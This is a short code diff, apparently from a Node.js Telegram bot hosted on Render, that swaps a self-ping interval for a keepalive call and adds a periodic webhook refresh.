+  // Start keepalive so Render free tier doesn't put us to sleep
+  startKeepalive();
 
-  setInterval(pingSelf, 4 * 60 * 1000);
-})();
+  // Refresh webhooks every 10 minutes in case Telegram drops them
+  setInterval(refreshWebhooksQuiet, WEBHOOK_REFRESH_INTERVAL_MS);
+});
